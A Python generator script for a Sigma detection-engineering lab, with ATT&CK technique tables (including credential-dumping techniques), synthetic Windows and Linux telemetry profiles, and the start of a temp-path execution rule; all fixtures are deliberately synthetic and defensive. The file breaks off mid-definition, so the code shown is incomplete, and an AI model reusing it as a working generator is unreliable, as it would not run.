"""Deterministic generator for the sigma-detection-engineering-lab rule catalog.

Generates, from a single in-repository data definition:

* original Sigma rules under ``rules/``
* detection metadata sidecars under ``metadata/rules/``
* synthetic JSONL fixtures under ``fixtures/rules/`` and ``fixtures/correlation/``
* the pinned MITRE ATT&CK subset under ``data/attack/``
* the telemetry catalog and allowed-taxonomy configuration under ``config/``

Everything produced is synthetic. No production telemetry, credentials, real
hostnames, routable addresses, or executable payloads are emitted.

Run:
    python tools/generate_all_rules.py
"""

from __future__ import annotations

import json
import re
import shutil
import sys
import uuid
from datetime import datetime, timedelta, timezone
from pathlib import Path
from typing import Any

import yaml

# --------------------------------------------------------------------------------------
# Project constants
# --------------------------------------------------------------------------------------

ROOT = Path(__file__).resolve().parents[1]

AUTHOR = "Salvatore Mazzaglia"
LICENSE = "MIT"
RULE_DATE = "2026-08-01"
CREATED_AT = "2026-08-01T00:00:00Z"
MODIFIED_AT = "2026-08-01T00:00:00Z"
SIDECAR_SCHEMA_VERSION = "1.0.0"
FIXTURE_SCHEMA_VERSION = "1.0.0"
RULE_VERSION = "1.0.0"
UUID_BASE = "https://github.com/salvomazzaglia/sigma-detection-engineering-lab"
ATTACK_VERSION = "19.1"
ATTACK_DATASET_DATE = "2026-04-28"

# Synthetic path placeholders (never real filesystem locations).
P_TEMP_USER = "C:\\Synthetic\\Users\\synthetic-user\\AppData\\Local\\Temp\\"
P_TEMP_WIN = "C:\\Synthetic\\Windows\\Temp\\"
P_PUBLIC = "C:\\Synthetic\\Users\\Public\\"
P_SYS32 = "C:\\Synthetic\\Windows\\System32\\"
P_PROG = "C:\\Synthetic\\Program Files\\"
P_USERDIR = "C:\\Synthetic\\Users\\synthetic-user\\"
F_TEMP_USER = "\\AppData\\Local\\Temp\\"
F_TEMP_WIN = "\\Windows\\Temp\\"
F_PUBLIC = "\\Users\\Public\\"
SYNTH_URL = "https://example.invalid/synthetic"
ENC_PLACEHOLDER = "SYNTHETIC_ENCODED_PLACEHOLDER"

HOST_WIN = "SYNTHETIC-HOST-01"
HOST_DC = "SYNTHETIC-DC01"
HOST_LX = "SYNTHETIC-LINUX-01"
USER_STD = "synthetic-user"
USER_ADM = "synthetic-admin"
USER_SVC = "synthetic-service"
DOC_IP_1 = "192.0.2.10"
DOC_IP_2 = "192.0.2.77"

BASE_TIME = datetime(2026, 8, 1, 9, 0, 0, tzinfo=timezone.utc)

# --------------------------------------------------------------------------------------
# ATT&CK reference tables (identifiers only, never invented)
# --------------------------------------------------------------------------------------

TACTICS: dict[str, tuple[str, str]] = {
    "TA0002": ("Execution", "execution"),
    "TA0003": ("Persistence", "persistence"),
    "TA0004": ("Privilege Escalation", "privilege-escalation"),
    "TA0005": ("Defense Evasion", "defense-evasion"),
    "TA0006": ("Credential Access", "credential-access"),
    "TA0011": ("Command and Control", "command-and-control"),
}

TECHNIQUES: dict[str, tuple[str, list[str]]] = {
    "T1027": ("Obfuscated Files or Information", ["TA0005"]),
    "T1003.001": ("OS Credential Dumping: LSASS Memory", ["TA0006"]),
    "T1003.006": ("OS Credential Dumping: DCSync", ["TA0006"]),
    "T1053.003": ("Scheduled Task/Job: Cron", ["TA0002", "TA0003", "TA0004"]),
    "T1053.005": ("Scheduled Task/Job: Scheduled Task", ["TA0002", "TA0003", "TA0004"]),
    "T1059.001": ("Command and Scripting Interpreter: PowerShell", ["TA0002"]),
    "T1059.003": ("Command and Scripting Interpreter: Windows Command Shell", ["TA0002"]),
    "T1059.004": ("Command and Scripting Interpreter: Unix Shell", ["TA0002"]),
    "T1098": ("Account Manipulation", ["TA0003", "TA0004"]),
    "T1098.004": ("Account Manipulation: SSH Authorized Keys", ["TA0003", "TA0004"]),
    "T1105": ("Ingress Tool Transfer", ["TA0011"]),
    "T1110.001": ("Brute Force: Password Guessing", ["TA0006"]),
    "T1110.003": ("Brute Force: Password Spraying", ["TA0006"]),
    "T1112": ("Modify Registry", ["TA0005"]),
    "T1136.001": ("Create Account: Local Account", ["TA0003"]),
    "T1140": ("Deobfuscate/Decode Files or Information", ["TA0005"]),
    "T1204.002": ("User Execution: Malicious File", ["TA0002"]),
    "T1218.005": ("System Binary Proxy Execution: Mshta", ["TA0005"]),
    "T1218.010": ("System Binary Proxy Execution: Regsvr32", ["TA0005"]),
    "T1222.002": (
        "File and Directory Permissions Modification: "
        "Linux and Mac File and Directory Permissions Modification",
        ["TA0005"],
    ),
    "T1484.001": ("Domain or Tenant Policy Modification: Group Policy Modification", ["TA0004", "TA0005"]),
    "T1484.002": ("Domain or Tenant Policy Modification: Trust Modification", ["TA0004", "TA0005"]),
    "T1505.003": ("Server Software Component: Web Shell", ["TA0003"]),
    "T1543.002": ("Create or Modify System Process: Systemd Service", ["TA0003", "TA0004"]),
    "T1543.003": ("Create or Modify System Process: Windows Service", ["TA0003", "TA0004"]),
    "T1546.003": (
        "Event Triggered Execution: Windows Management Instrumentation Event Subscription",
        ["TA0003", "TA0004"],
    ),
    "T1547.001": ("Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder", ["TA0003", "TA0004"]),
    "T1547.006": ("Boot or Logon Autostart Execution: Kernel Modules and Extensions", ["TA0003", "TA0004"]),
    "T1548.003": ("Abuse Elevation Control Mechanism: Sudo and Sudo Caching", ["TA0004", "TA0005"]),
    "T1555": ("Credentials from Password Stores", ["TA0006"]),
    "T1558.003": ("Steal or Forge Kerberos Tickets: Kerberoasting", ["TA0006"]),
    "T1620": ("Reflective Code Loading", ["TA0005"]),
    "T1685": ("Impair Defenses", ["TA0005"]),
    "T1685.005": ("Impair Defenses: Clear Windows Event Logs", ["TA0005"]),
    "T1685.006": ("Impair Defenses: Clear Linux or Mac System Logs", ["TA0005"]),
    "T1686": ("Disable or Modify System Firewall", ["TA0005"]),
}

# Verified defensive-object mappings supplied by the pinned ATT&CK extraction.
# Techniques absent from this table intentionally carry empty defensive arrays.
DEFENSIVE: dict[str, dict[str, Any]] = {
    "T1059.001": {"det": "DET0455", "an": "AN1252", "dc": ["DC0032", "DC0064"]},
    "T1053.005": {"det": "DET0441", "an": "AN1221", "dc": ["DC0001"]},
    "T1547.001": {"det": "DET0365", "an": "AN1032", "dc": ["DC0063"]},
    "T1543.003": {"det": "DET0552", "an": "AN1527", "dc": ["DC0060"]},
    "T1546.003": {"det": "DET0086", "an": "AN0236", "dc": ["DC0008"]},
    "T1685.005": {"det": "DET0532", "an": "AN1472", "dc": ["DC0038"]},
    "T1003.001": {"det": "DET0363", "an": "AN1030", "dc": ["DC0035"]},
    "T1686": {"det": "DET0145", "an": "AN0406", "dc": ["DC0051"]},
    "T1105": {"det": "DET0060", "an": "AN0165", "dc": ["DC0082"]},
    "T1136.001": {"det": "DET0447", "an": "AN1235", "dc": ["DC0014"]},
    "T1098": {"det": "DET0096", "an": "AN0265", "dc": ["DC0010"]},
    "T1484.001": {"det": "DET0305", "an": "AN0854", "dc": ["DC0066"]},
    "T1110.001": {"det": "DET0551", "an": "AN1521", "dc": ["DC0002"]},
    "T1110.003": {"det": "DET0487", "an": "AN1336", "dc": ["DC0002"]},
    "T1059.004": {"det": "DET0384", "an": "AN1081", "dc": ["DC0032"]},
    "T1543.002": {"det": "DET0253", "an": "AN0701", "dc": ["DC0039"]},
    "T1053.003": {"det": "DET0290", "an": "AN0805", "dc": ["DC0001"]},
    "T1098.004": {"det": "DET0126", "an": "AN0350", "dc": ["DC0061"]},
    "T1222.002": {"det": "DET0351", "an": "AN0998", "dc": ["DC0059"]},
    "T1685.006": {"det": "DET0520", "an": "AN1438", "dc": ["DC0040"]},
}

UNMAPPED_REASON = (
    "No Detection Strategy, Analytic, or Data Component identifier for this technique was "
    "present in the pinned ATT&CK extraction used by this lab. Defensive arrays are left "
    "empty rather than populated with unverified identifiers."
)

# --------------------------------------------------------------------------------------
# Reference URLs
# --------------------------------------------------------------------------------------


def attack_url(tid: str) -> str:
    parts = tid.split(".")
    if len(parts) == 2:
        return f"https://attack.mitre.org/techniques/{parts[0]}/{parts[1]}/"
    return f"https://attack.mitre.org/techniques/{parts[0]}/"


def ms_event(event_id: int) -> str:
    return (
        "https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/"
        f"windows-10-security-auditing/event-{event_id}"
    )


MS_SYSMON = "https://learn.microsoft.com/en-us/sysinternals/downloads/sysmon"
MS_SCM = "https://learn.microsoft.com/en-us/windows/win32/services/service-control-manager"
MS_PS_LOGGING = (
    "https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/"
    "about/about_logging_windows"
)
MS_MPPREF = "https://learn.microsoft.com/en-us/powershell/module/defender/add-mppreference"
MS_CERTUTIL = (
    "https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/certutil"
)
MS_WINCMD = (
    "https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/"
    "windows-commands"
)
MS_NETSH = (
    "https://learn.microsoft.com/en-us/troubleshoot/windows-server/networking/"
    "netsh-advfirewall-firewall-control-firewall-behavior"
)
MS_LAPS = "https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-overview"
MS_WMI_SUB = (
    "https://learn.microsoft.com/en-us/windows/win32/wmisdk/receiving-a-wmi-event"
)
MS_SCHTASKS = (
    "https://learn.microsoft.com/en-us/windows/win32/taskschd/task-scheduler-start-page"
)
MS_REG_RUN = (
    "https://learn.microsoft.com/en-us/windows/win32/setupapi/run-and-runonce-registry-keys"
)
MS_ADREPL = (
    "https://learn.microsoft.com/en-us/windows/win32/adschema/r-ds-replication-get-changes"
)
MS_GPO = (
    "https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/"
    "component-updates/group-policy-basics"
)
MS_TRUST = (
    "https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/"
    "understand-domain-trusts"
)
MS_DELEG = (
    "https://learn.microsoft.com/en-us/windows-server/security/kerberos/"
    "kerberos-constrained-delegation-overview"
)
MS_SPN = "https://learn.microsoft.com/en-us/windows/win32/ad/service-principal-names"
MS_LOCALGROUP = (
    "https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.localaccounts/"
    "add-localgroupmember"
)
MS_SCHTASK_PS = (
    "https://learn.microsoft.com/en-us/powershell/module/scheduledtasks/registerscheduledtask"
)
MS_AUDITPOL = (
    "https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/auditpol"
)
MAN_SUDOERS = "https://man7.org/linux/man-pages/man5/sudoers.5.html"
MAN_CRONTAB = "https://man7.org/linux/man-pages/man5/crontab.5.html"
MAN_SYSTEMD = "https://man7.org/linux/man-pages/man5/systemd.service.5.html"
MAN_SSHD = "https://man7.org/linux/man-pages/man8/sshd.8.html"
MAN_CHMOD = "https://man7.org/linux/man-pages/man1/chmod.1.html"
MAN_INSMOD = "https://man7.org/linux/man-pages/man8/insmod.8.html"
MAN_AUDITD = "https://man7.org/linux/man-pages/man8/auditd.8.html"
MAN_USERADD = "https://man7.org/linux/man-pages/man8/useradd.8.html"
MAN_BASH = "https://man7.org/linux/man-pages/man1/bash.1.html"
MAN_FHS_TMP = "https://man7.org/linux/man-pages/man7/file-hierarchy.7.html"
SIGMA_CORRELATION_SPEC = (
    "https://sigmahq.io/sigma-specification/specification/"
    "sigma-correlation-rules-specification.html"
)

# --------------------------------------------------------------------------------------
# Telemetry profiles
# --------------------------------------------------------------------------------------

PROFILES: dict[str, dict[str, Any]] = {
    "win_process_creation": {
        "platform": "windows",
        "logsource": {"category": "process_creation", "product": "windows"},
        "required_logs": ["Windows process creation telemetry"],
        "channels": ["Microsoft-Windows-Sysmon/Operational", "Security"],
        "providers": ["Microsoft-Windows-Sysmon", "Microsoft-Windows-Security-Auditing"],
        "optional_fields": ["OriginalFileName", "IntegrityLevel", "CurrentDirectory", "Hashes"],
        "collection_prerequisites": [
            "A process creation source is enabled (Sysmon Event ID 1 or Security Event ID 4688).",
            "Command-line auditing is enabled when Security 4688 is the only available source.",
        ],
        "expected_collection_gaps": [
            "Security 4688 without command-line auditing provides no CommandLine value.",
            "Short-lived processes may be lost if the agent is restarted during collection.",
        ],
        "normalization_assumptions": [
            "Image and ParentImage are absolute paths using backslash separators.",
            "CommandLine retains the original argument order and spacing.",
        ],
        "ingestion_differences": [
            "Some pipelines lowercase paths; the lab matcher is case-insensitive by default.",
            "Sysmon and 4688 differ in parent process fidelity and in User field formatting.",
        ],
        "retention": "Process creation is high volume; 30 to 90 days of hot retention is typical.",
        "channel": "Microsoft-Windows-Sysmon/Operational",
        "provider": "Microsoft-Windows-Sysmon",
        "host": HOST_WIN,
        "user": f"{HOST_WIN}\\{USER_STD}",
        "base": {
            "Computer": HOST_WIN,
            "Channel": "Microsoft-Windows-Sysmon/Operational",
            "EventID": 1,
            "Image": P_SYS32 + "notepad.exe",
            "OriginalFileName": "NOTEPAD.EXE",
            "CommandLine": "notepad.exe",
            "ParentImage": "C:\\Synthetic\\Windows\\explorer.exe",
            "ParentCommandLine": "explorer.exe",
            "CurrentDirectory": P_USERDIR,
            "IntegrityLevel": "Medium",
            "User": f"{HOST_WIN}\\{USER_STD}",
        },
    },
    "win_registry_set": {
        "platform": "windows",
        "logsource": {"category": "registry_set", "product": "windows"},
        "required_logs": ["Windows registry value modification telemetry"],
        "channels": ["Microsoft-Windows-Sysmon/Operational"],
        "providers": ["Microsoft-Windows-Sysmon"],
        "optional_fields": ["Image", "User", "ProcessGuid"],
        "collection_prerequisites": [
            "Registry value-set auditing is enabled (Sysmon Event ID 13 or equivalent).",
            "The autostart hives of interest are included in the collection filter.",
        ],
        "expected_collection_gaps": [
            "Registry auditing is frequently filtered to a small key allowlist.",
            "Values written by offline hive edits are not observed.",
        ],
        "normalization_assumptions": [
            "TargetObject uses the full registry path with HKLM or HKU prefixes.",
            "Details contains the written value rendered as text.",
        ],
        "ingestion_differences": [
            "Some pipelines split TargetObject into key and value name fields.",
            "REG_BINARY values may be rendered differently between agents.",
        ],
        "retention": "Registry value telemetry is moderate volume; 90 days is usually affordable.",
        "channel": "Microsoft-Windows-Sysmon/Operational",
        "provider": "Microsoft-Windows-Sysmon",
        "host": HOST_WIN,
        "user": f"{HOST_WIN}\\{USER_STD}",
        "base": {
            "Computer": HOST_WIN,
            "Channel": "Microsoft-Windows-Sysmon/Operational",
            "EventID": 13,
            "EventType": "SetValue",
            "TargetObject": "HKU\\S-1-5-21-SYNTHETIC\\Software\\SyntheticApp\\Settings\\Theme",
            "Details": "dark",
            "Image": P_PROG + "SyntheticApp\\synthetic_app.exe",
            "User": f"{HOST_WIN}\\{USER_STD}",
        },
    },
    "win_file_event": {
        "platform": "windows",
        "logsource": {"category": "file_event", "product": "windows"},
        "required_logs": ["Windows file creation telemetry"],
        "channels": ["Microsoft-Windows-Sysmon/Operational"],
        "providers": ["Microsoft-Windows-Sysmon"],
        "optional_fields": ["CreationUtcTime", "User", "ProcessGuid"],
        "collection_prerequisites": [
            "File creation auditing is enabled (Sysmon Event ID 11 or equivalent).",
            "User-writable directories are not globally excluded from collection.",
        ],
        "expected_collection_gaps": [
            "File modification without creation may not raise an event.",
            "Aggressive exclusion lists commonly remove temporary directories.",
        ],
        "normalization_assumptions": [
            "TargetFilename is an absolute path including the file extension.",
            "Image identifies the writing process.",
        ],
        "ingestion_differences": [
            "Some agents report short paths or device paths instead of drive letters.",
            "Extension casing varies between producers.",
        ],
        "retention": "File creation telemetry is high volume; 30 days of hot retention is typical.",
        "channel": "Microsoft-Windows-Sysmon/Operational",
        "provider": "Microsoft-Windows-Sysmon",
        "host": HOST_WIN,
        "user": f"{HOST_WIN}\\{USER_STD}",
        "base": {
            "Computer": HOST_WIN,
            "Channel": "Microsoft-Windows-Sysmon/Operational",
            "EventID": 11,
            "TargetFilename": P_USERDIR + "Documents\\synthetic_notes.txt",
            "Image": P_PROG + "SyntheticApp\\synthetic_app.exe",
            "CreationUtcTime": "2026-08-01 09:00:00.000",
            "User": f"{HOST_WIN}\\{USER_STD}",
        },
    },
    "win_process_access": {
        "platform": "windows",
        "logsource": {"category": "process_access", "product": "windows"},
        "required_logs": ["Windows process access telemetry"],
        "channels": ["Microsoft-Windows-Sysmon/Operational"],
        "providers": ["Microsoft-Windows-Sysmon"],
        "optional_fields": ["CallTrace", "SourceUser", "TargetUser"],
        "collection_prerequisites": [
            "Process access auditing is enabled (Sysmon Event ID 10 or an EDR equivalent).",
            "The sensitive authentication process is included in the monitored target list.",
        ],
        "expected_collection_gaps": [
            "Process access auditing is often disabled because of its volume.",
            "Kernel-mode access paths are not represented in this event class.",
        ],
        "normalization_assumptions": [
            "GrantedAccess is a hexadecimal string such as 0x1010.",
            "SourceImage and TargetImage are absolute paths.",
        ],
        "ingestion_differences": [
            "Some producers emit GrantedAccess as a decimal integer.",
            "CallTrace availability depends on symbol resolution settings.",
        ],
        "retention": "Process access telemetry is very high volume; scope filters are required.",
        "channel": "Microsoft-Windows-Sysmon/Operational",
        "provider": "Microsoft-Windows-Sysmon",
        "host": HOST_WIN,
        "user": f"{HOST_WIN}\\{USER_STD}",
        "base": {
            "Computer": HOST_WIN,
            "Channel": "Microsoft-Windows-Sysmon/Operational",
            "EventID": 10,
            "SourceImage": P_PROG + "SyntheticApp\\synthetic_app.exe",
            "TargetImage": P_SYS32 + "svchost.exe",
            "GrantedAccess": "0x1000",
            "CallTrace": "SYNTHETIC-CALLTRACE-PLACEHOLDER",
            "SourceUser": f"{HOST_WIN}\\{USER_STD}",
        },
    },
    "win_wmi_event": {
        "platform": "windows",
        "logsource": {"category": "wmi_event", "product": "windows"},
        "required_logs": ["Windows WMI subscription telemetry"],
        "channels": ["Microsoft-Windows-Sysmon/Operational"],
        "providers": ["Microsoft-Windows-Sysmon"],
        "optional_fields": ["Query", "Destination", "Consumer", "Filter"],
        "collection_prerequisites": [
            "WMI subscription auditing is enabled (Sysmon Event IDs 19, 20 and 21).",
            "The agent configuration does not exclude WMI activity generated by management tools.",
        ],
        "expected_collection_gaps": [
            "Subscriptions created before agent deployment are not observed.",
            "Remote subscription creation may be attributed to the target host only.",
        ],
        "normalization_assumptions": [
            "EventType distinguishes filter, consumer, and binding records.",
            "Operation is either Created or Deleted.",
        ],
        "ingestion_differences": [
            "Field names differ between Sysmon and WMI-Activity operational logs.",
            "Query text may be truncated by some pipelines.",
        ],
        "retention": "WMI subscription telemetry is low volume and inexpensive to retain for a year.",
        "channel": "Microsoft-Windows-Sysmon/Operational",
        "provider": "Microsoft-Windows-Sysmon",
        "host": HOST_WIN,
        "user": f"{HOST_WIN}\\{USER_ADM}",
        "base": {
            "Computer": HOST_WIN,
            "Channel": "Microsoft-Windows-Sysmon/Operational",
            "EventID": 19,
            "EventType": "WmiFilterEvent",
            "Operation": "Deleted",
            "Name": "SyntheticInventoryFilter",
            "Query": "SELECT * FROM SyntheticInventoryClass",
            "Consumer": "SyntheticInventoryConsumer",
            "Filter": "SyntheticInventoryFilter",
            "User": f"{HOST_WIN}\\{USER_ADM}",
        },
    },
    "win_security": {
        "platform": "windows",
        "logsource": {"product": "windows", "service": "security"},
        "required_logs": ["Windows Security event log"],
        "channels": ["Security"],
        "providers": ["Microsoft-Windows-Security-Auditing"],
        "optional_fields": ["SubjectDomainName", "TargetDomainName", "IpAddress", "LogonType"],
        "collection_prerequisites": [
            "The relevant advanced audit policy subcategory is enabled for success events.",
            "Domain controller Security logs are forwarded for directory-scoped events.",
        ],
        "expected_collection_gaps": [
            "Events raised on a domain controller that is not forwarding logs are invisible.",
            "Security log wrapping on busy controllers can drop events before forwarding.",
        ],
        "normalization_assumptions": [
            "EventID is an integer and Channel is the literal string Security.",
            "Account names are provided without the domain prefix in TargetUserName.",
        ],
        "ingestion_differences": [
            "Some pipelines rename EventID to event.code or similar.",
            "Directory attribute events may arrive with XML-encoded values.",
        ],
        "retention": "Security log volume varies widely; 180 to 365 days is common for identity events.",
        "channel": "Security",
        "provider": "Microsoft-Windows-Security-Auditing",
        "host": HOST_DC,
        "user": f"SYNTHETIC\\{USER_ADM}",
        "base": {
            "Computer": HOST_DC,
            "Channel": "Security",
            "EventID": 4624,
            "SubjectUserName": USER_ADM,
            "SubjectDomainName": "SYNTHETIC",
            "TargetUserName": USER_STD,
            "TargetDomainName": "SYNTHETIC",
            "IpAddress": DOC_IP_1,
        },
    },
    "win_system": {
        "platform": "windows",
        "logsource": {"product": "windows", "service": "system"},
        "required_logs": ["Windows System event log"],
        "channels": ["System"],
        "providers": ["Service Control Manager"],
        "optional_fields": ["ServiceType", "StartType", "AccountName"],
        "collection_prerequisites": [
            "The System event log is collected from endpoints and servers.",
            "Service Control Manager events are not filtered out by the forwarder subscription.",
        ],
        "expected_collection_gaps": [
            "Service installation performed by driver loading is not represented here.",
            "Servers with aggressive System log filters may drop Event ID 7045.",
        ],
        "normalization_assumptions": [
            "ImagePath contains the full service binary path including any arguments.",
            "Provider_Name identifies Service Control Manager.",
        ],
        "ingestion_differences": [
            "Quoted service paths may or may not retain surrounding quotation marks.",
            "Some pipelines rename ImagePath to service.executable.",
        ],
        "retention": "System log volume is low; 365 days of retention is generally affordable.",
        "channel": "System",
        "provider": "Service Control Manager",
        "host": HOST_WIN,
        "user": f"{HOST_WIN}\\{USER_ADM}",
        "base": {
            "Computer": HOST_WIN,
            "Channel": "System",
            "EventID": 7045,
            "Provider_Name": "Service Control Manager",
            "ServiceName": "SyntheticInventoryAgent",
            "ImagePath": P_PROG + "SyntheticAgent\\synthetic_agent.exe",
            "ServiceType": "user mode service",
            "StartType": "auto start",
            "AccountName": "LocalSystem",
        },
    },
    "win_ps_script": {
        "platform": "windows",
        "logsource": {"product": "windows", "category": "ps_script"},
        "required_logs": ["Windows PowerShell script block logging"],
        "channels": ["Microsoft-Windows-PowerShell/Operational"],
        "providers": ["Microsoft-Windows-PowerShell"],
        "optional_fields": ["Path", "ScriptBlockId", "MessageNumber", "MessageTotal"],
        "collection_prerequisites": [
            "Script block logging is enabled through Group Policy or registry configuration.",
            "PowerShell operational log collection is enabled on the endpoint.",
        ],
        "expected_collection_gaps": [
            "PowerShell version 2 engines do not emit script block logs.",
            "Very large script blocks are split across multiple events.",
        ],
        "normalization_assumptions": [
            "ScriptBlockText contains the decoded script text as executed.",
            "EventID 4104 identifies script block execution.",
        ],
        "ingestion_differences": [
            "Multi-part script blocks may need reassembly before matching.",
            "Some pipelines strip newlines from ScriptBlockText.",
        ],
        "retention": "Script block logging is moderate to high volume; 90 days is a common target.",
        "channel": "Microsoft-Windows-PowerShell/Operational",
        "provider": "Microsoft-Windows-PowerShell",
        "host": HOST_WIN,
        "user": f"{HOST_WIN}\\{USER_STD}",
        "base": {
            "Computer": HOST_WIN,
            "Channel": "Microsoft-Windows-PowerShell/Operational",
            "EventID": 4104,
            "ScriptBlockText": "Get-Date | Out-String",
            "ScriptBlockId": "00000000-0000-0000-0000-00000000cafe",
            "Path": P_USERDIR + "Documents\\synthetic_report.ps1",
            "User": f"{HOST_WIN}\\{USER_STD}",
        },
    },
    "linux_process_creation": {
        "platform": "linux",
        "logsource": {"category": "process_creation", "product": "linux"},
        "required_logs": ["Linux execve auditing"],
        "channels": ["auditd"],
        "providers": ["auditd"],
        "optional_fields": ["CurrentDirectory", "ParentCommandLine", "ProcessId"],
        "collection_prerequisites": [
            "An execve audit rule or equivalent process telemetry agent is deployed.",
            "Audit rules are not limited to a narrow allowlist of binaries.",
        ],
        "expected_collection_gaps": [
            "Containers without a shared audit namespace may not report execve records.",
            "Audit backlog limits can drop records under load.",
        ],
        "normalization_assumptions": [
            "Image is the absolute executable path and CommandLine is the joined argument vector.",
            "ParentImage identifies the parent executable path.",
        ],
        "ingestion_differences": [
            "auditd argument vectors may be hex-encoded before normalization.",
            "Some agents report the argv array instead of a joined string.",
        ],
        "retention": "Execve telemetry is high volume; 30 to 60 days of hot retention is typical.",
        "channel": "auditd",
        "provider": "auditd",
        "host": HOST_LX,
        "user": USER_STD,
        "base": {
            "Computer": HOST_LX,
            "Image": "/usr/bin/cat",
            "CommandLine": "cat /etc/synthetic-example.conf",
            "ParentImage": "/usr/bin/bash",
            "ParentCommandLine": "-bash",
            "CurrentDirectory": "/home/synthetic-user",
            "User": USER_STD,
        },
    },
    "linux_file_event": {
        "platform": "linux",
        "logsource": {"category": "file_event", "product": "linux"},
        "required_logs": ["Linux file integrity auditing"],
        "channels": ["auditd"],
        "providers": ["auditd"],
        "optional_fields": ["Image", "ProcessId", "Mode"],
        "collection_prerequisites": [
            "Audit watch rules cover the sensitive directories referenced by the rule.",
            "The audit daemon is running and its rules survive reboot.",
        ],
        "expected_collection_gaps": [
            "Directories without an explicit watch rule produce no events.",
            "Bind-mounted paths inside containers may bypass host watches.",
        ],
        "normalization_assumptions": [
            "TargetFilename is an absolute POSIX path.",
            "Image identifies the writing process where the producer supplies it.",
        ],
        "ingestion_differences": [
            "Path reconstruction from auditd PATH records varies between agents.",
            "Relative paths may appear when the working directory record is missing.",
        ],
        "retention": "File watch telemetry is moderate volume; 90 days is a reasonable target.",
        "channel": "auditd",
        "provider": "auditd",
        "host": HOST_LX,
        "user": USER_ADM,
        "base": {
            "Computer": HOST_LX,
            "TargetFilename": "/home/synthetic-user/synthetic-notes.txt",
            "Image": "/usr/bin/vim",
            "Mode": "0644",
            "User": USER_ADM,
        },
    },
    "linux_auth": {
        "platform": "linux",
        "logsource": {"product": "linux", "service": "auth"},
        "required_logs": ["Linux authentication log"],
        "channels": ["/var/log/auth.log", "/var/log/secure"],
        "providers": ["sshd", "sudo", "useradd"],
        "optional_fields": ["SourceIp", "SourcePort", "User"],
        "collection_prerequisites": [
            "The authentication facility is forwarded from the host to the collector.",
            "The syslog message body is preserved rather than truncated.",
        ],
        "expected_collection_gaps": [
            "Hosts using journald without syslog forwarding require a different collector.",
            "Rate-limited syslog can drop bursts of failures.",
        ],
        "normalization_assumptions": [
            "ProcessName holds the syslog program name and Message holds the free-text body.",
            "SourceIp is populated only for network authentication attempts.",
        ],
        "ingestion_differences": [
            "Distribution-specific message wording differs between sshd builds.",
            "Some pipelines pre-parse the message into structured fields.",
        ],
        "retention": "Authentication logs are low volume; 365 days of retention is common.",
        "channel": "/var/log/auth.log",
        "provider": "sshd",
        "host": HOST_LX,
        "user": USER_STD,
        "base": {
            "Computer": HOST_LX,
            "ProcessName": "sshd",
            "Message": f"Accepted publickey for {USER_STD} from {DOC_IP_1} port 50122 ssh2",
            "User": USER_STD,
            "SourceIp": DOC_IP_1,
        },
    },
}

# --------------------------------------------------------------------------------------
# Rule catalog definition
# --------------------------------------------------------------------------------------


def rule(**kwargs: Any) -> dict[str, Any]:
    kwargs.setdefault("status", "experimental")
    kwargs.setdefault("related", [])
    kwargs.setdefault("extra_techniques", [])
    return kwargs


def case(name: str, scenario: str, notes: str, **fields: Any) -> dict[str, Any]:
    return {"name": name, "scenario": scenario, "notes": notes, "fields": fields}


TEMP_FRAGMENTS = [F_TEMP_USER, F_TEMP_WIN, F_PUBLIC]
OFFICE_PARENTS = [
    "\\synthetic_word.exe",
    "\\synthetic_excel.exe",
    "\\synthetic_powerpoint.exe",
    "\\synthetic_outlook.exe",
]
PRIV_GROUPS = ["Domain Admins", "Enterprise Admins", "Schema Admins", "Administrators"]

RULES: list[dict[str, Any]] = []

# ---------------------------------------------------------------- WINDOWS (16)

RULES.append(
    rule(
        cid="SDEL-WIN-001",
        family="windows",
        path="windows/process_creation",
        file="process_launched_from_user_writable_temp_path.yml",
        title="Process Launched From Synthetic User-Writable Temporary Path",
        level="medium",
        profile="win_process_creation",
        desc=(
            "Detects a process image executing from a user-writable temporary or public "
            "directory in the synthetic lab environment. Staging binaries in directories that "
            "any interactive user can write to is a recurring pattern in delivery and "
            "post-exploitation activity, and it also occurs during legitimate software "
            "installation, so the rule is scored medium rather than high."
        ),
        hypothesis=(
            "If an adversary stages tooling in a user-writable directory, the resulting process "
            "creation event will show an Image path rooted in a temporary or public directory "
            "rather than in a managed installation directory."
        ),
        techniques=["T1204.002"],
        refs=[attack_url("T1204.002"), MS_SYSMON],
        detection=[
            (
                "selection_writable_path",
                [("Image|startswith", [P_TEMP_USER, P_TEMP_WIN, P_PUBLIC])],
            ),
            ("filter_approved_installer", [("Image|endswith", "\\synthetic_patch_installer.exe")]),
        ],
        condition="selection_writable_path and not filter_approved_installer",
        fps=[
            "Software installers and patch bundles that unpack to the per-user temporary "
            "directory before executing, such as the synthetic patch installer excluded by the "
            "rule filter.",
            "Endpoint management agents that copy remediation binaries into the Windows "
            "temporary directory during scheduled maintenance windows.",
            "Developer build output executed directly from a temporary scratch directory on "
            "engineering workstations.",
        ],
        fp_strategy=(
            "Benign matches concentrate around packaged installers, patch management, and "
            "developer workstations. Tune with the writing or launching process identity and "
            "with the specific binary name rather than excluding the temporary directory tree."
        ),
        tuning=(
            "Prefer per-binary exclusions anchored on Image endswith plus a signature or hash "
            "condition. Do not exclude the whole AppData\\Local\\Temp prefix, because that "
            "removes the detection value of the rule entirely."
        ),
        test_strategy=(
            "Positive cases execute from the per-user and machine temporary directories. "
            "Negative cases cover managed installation directories, the system directory, and "
            "the explicitly allowed patch installer."
        ),
        volume="Low to moderate on managed endpoints; higher on developer workstations.",
        related=["SDEL-WIN-014", "SDEL-COR-006"],
        pos=[
            case(
                "user_temp_directory",
                "Binary executed from the per-user temporary directory.",
                "Image prefix matches the per-user temporary directory selection.",
                Image=P_TEMP_USER + "synthetic_tool.exe",
                OriginalFileName="synthetic_tool.exe",
                CommandLine=P_TEMP_USER + "synthetic_tool.exe --synthetic-run",
                CurrentDirectory=P_TEMP_USER,
            ),
            case(
                "machine_temp_directory",
                "Binary executed from the machine-wide Windows temporary directory.",
                "Image prefix matches the machine temporary directory selection.",
                Image=P_TEMP_WIN + "synthetic_stage.exe",
                OriginalFileName="synthetic_stage.exe",
